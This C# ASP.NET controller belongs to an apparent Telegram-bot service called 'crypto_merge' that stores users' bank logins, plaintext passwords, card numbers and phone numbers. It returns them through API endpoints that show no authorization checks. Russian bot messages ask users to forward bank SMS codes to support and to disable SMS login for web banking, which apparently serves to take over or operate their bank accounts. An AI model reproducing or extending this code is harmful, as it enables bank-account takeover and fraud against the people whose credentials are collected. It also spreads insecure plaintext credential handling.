using BusLogic.Services;
using crypto_merge.Tg.Bot;
using crypto_merge.Tg.Bot.Services;
using InternetDatabase.EntityDB;
using Microsoft.AspNetCore.Mvc;

namespace crypto_merge.Controllers;

[ApiController]
[Route("api/[controller]")]
public class WalletsController(WalletService walletService) : ControllerBase
{
    [HttpGet("balance/transactions/{transactionId}")]
    public async Task<IActionResult> GetBalance(int transactionId)
    {
        return Ok(await walletService.GetTotalBalanceAsTransactionAndTempAsync(transactionId));
    }

    [HttpGet("all/{chatId}")]
    public async Task<IActionResult> Get(long chatId, [FromServices] CurrencyService currencyService)
    {
        var wallets = await walletService.GetAsync(chatId, true);
        var currency = await currencyService.GetCurrencyAsync("USD");

        if (currency is null)
            return Conflict();

        return Ok(wallets.Select(async o =>
        {
            var tuk = await walletService.GetLimitYesterdayAsync(o.Id, "USD");
            var boostTuk = await walletService.GetBalanceBoost(o.Id, "USD");

            return new { o.Id, Phone = o.PhoneNumber, o.NumberCard, o.Login, o.Status, o.Password, o.Bank, BalanceBoost = o.BalanceBoost / currency.RubCurrency, o.CryptoCardId, o.AccountCryptoCardId, Tuk = tuk, BoostTuk = boostTuk };
        }).Select((o) =>
        {
            Task.WaitAny(o);

            return o.Result;
        }).ToArray());
    }

    [HttpPut("{id}/boost/{sum}/{currency}")]
    public async Task<IActionResult> PutBoost(int id, decimal sum, string currency)
    {
        if (await walletService.PutBalanceBoost(id, sum, currency) <= 0)
            return NotFound();

        return NoContent();
    }

    [HttpPut("{id}/ccid/{cc}")]
    public async Task<IActionResult> PutCCID(int id, string cc)
    {
        if (await walletService.PutCCID(id, cc) <= 0)
            return NotFound();

        return NoContent();
    }

    [HttpPut("{id}/accountCryptoCardId/{accountCryptoCardId}")]
    public async Task<IActionResult> PutCCID(int id, int accountCryptoCardId)
    {
        if (!await walletService.PutAccountCryptoCardId(id, accountCryptoCardId))
            return NotFound();

        return NoContent();
    }

    [HttpPost("{id}/sendMessage")]
    public async Task<IActionResult> Get(int id, string text, [FromServices] MessageSender sender)
    {
        var chatId = await walletService.GetAuthorChatId(id);

        if (chatId == 0)
            return NotFound();

        await sender.SendMessageAsync(chatId, text);

        return NoContent();
    }

    [HttpGet]
    public async Task<IActionResult> Get(string? login = null,string? numberCard = null,string? teleNumber = null,long? id = null)
    {
        var wallet = await walletService.GetAsync(id,login, numberCard, teleNumber);

        if (wallet is null)
            return NotFound();

        return Ok(new WalletResponse(wallet.Login,wallet.NumberCard,wallet.PhoneNumber,wallet.Id, wallet.Bank, wallet.Password));
    }

    [HttpDelete("{id}")]
    public async Task<IActionResult> Delete(int id)
    {
        if (await walletService.SoftDelete(id) <= 0)
            return NotFound();

        return NoContent();
    }


    /// <summary>
    /// Обновить статус кошелька 
    /// </summary>
    /// <returns></returns>
    [HttpPut("{id}/status/{walletStatus}")]
    public async Task<IActionResult> UpdateStatus(int id, WalletStatus walletStatus, [FromServices] MessageSender messageSender, [FromServices] UserService userService)
    {
        await walletService.UpdateStatusAsync(id, walletStatus);

        if (await userService.GetByWalletIdAsync(id) is not { } user)
            return Ok();

        await messageSender.SendMessageAsync(user.ChatId, walletStatus switch
        {
            WalletStatus.Connected=> "Ваш банк добавлен!Для авторизации пришлите код из смс в ТП",
            WalletStatus.Stop=>"Банк остановлен",
            _ => "Статус банка обновлен"
        });

        return Ok();
    }


    /// <summary>
    /// Список кошельков на проверку админом 
    /// </summary>
    /// <returns></returns>
    [HttpGet("new")]
    public async Task<IActionResult> New()
    {
        var connection = await walletService.GetByStatus(status: WalletStatus.Connection);
        var stopping = await walletService.GetByStatus(status: WalletStatus.Stopping);
        return Ok(connection.Concat(stopping).OrderByDescending(r => r.Id).Select(async o => new { o.Id, o.Status, o.PhoneNumber, o.NumberCard, o.Login, o.Password, o.Fio, o.Bank, Balance = await walletService.GetTotalBalanceAndTempAsync(o.Id) }).Select(o => { Task.WaitAny(o); return o.Result; }).ToArray());
    }

    /// <summary>
    /// Отправить запрос пользователю на обновление реквизитов 
    /// </summary>
    /// <param name="id"></param>
    /// <param name="messageSender"></param>
    /// <param name="userService"></param>
    /// <returns></returns>
    [HttpPut("{id}/reset")]
    public async Task<IActionResult> ResetWallet(int id, [FromServices] MessageSender messageSender, [FromServices] UserService userService)
    {
        var user = await userService.GetByWalletIdAsync(id);

        if (user is null)
            return NotFound();

        await walletService.TryDelete(id);

        var sendMessage = new SendMessage()
        {
            Text = "❌ Данные неверны, попробуйте еще раз через 10 минут",
            KeyboardMarkup = Keyboard.CreateInline(new InlineButton("Ввести новые реквизиты", "AppendRequisitePage")),
        };
        await messageSender.SendMessageAsync(user.ChatId,sendMessage);

        return Ok();
    }

    /// <summary>
    /// Отправить запрос пользователю на обновление реквизитов 
    /// </summary>
    /// <param name="id"></param>
    /// <param name="messageSender"></param>
    /// <param name="userService"></param>
    /// <returns></returns>
    [HttpPut("{id}/reset/sms")]
    public async Task<IActionResult> ResetWalletSMS(int id, [FromServices] MessageSender messageSender, [FromServices] UserService userService)
    {
        var user = await userService.GetByWalletIdAsync(id);

        if (user is null)
            return NotFound();

        await walletService.TryDelete(id);

        var sendMessage = new SendMessage()
        {
            Text = "Вам необходимо отключить вход по СМС в веб-версию. Инструкцию можно найти на канале."
        };
        await messageSender.SendMessageAsync(user.ChatId, sendMessage);

        return Ok();
    }
}
